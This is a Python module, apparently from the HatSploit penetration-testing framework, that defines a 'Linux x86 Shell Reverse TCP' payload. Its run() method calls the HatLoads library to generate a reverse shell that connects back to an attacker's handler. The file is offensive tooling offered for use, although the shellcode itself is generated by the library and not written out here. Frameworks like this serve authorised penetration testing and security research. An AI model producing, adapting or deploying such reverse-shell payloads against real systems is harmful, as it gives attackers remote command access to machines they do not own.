#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatloads import HatLoads


class HatSploitPayload(Payload, HatLoads):
    details = {
        'Name': "Linux x86 Shell Reverse TCP",
        'Payload': "linux/x86/shell_reverse_tcp",
        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
        'Description': "Shell reverse TCP payload for Linux x86.",
        'Architecture': "x86",
        'Platform': "linux",
        'Rank': "high",
        'Type': "reverse_tcp",
    }

    def run(self):
        return self.get_payload(
            self.details['Platform'],
            self.details['Architecture'],
            f"shell_{self.details['Type']}",
            self.handler,
        )
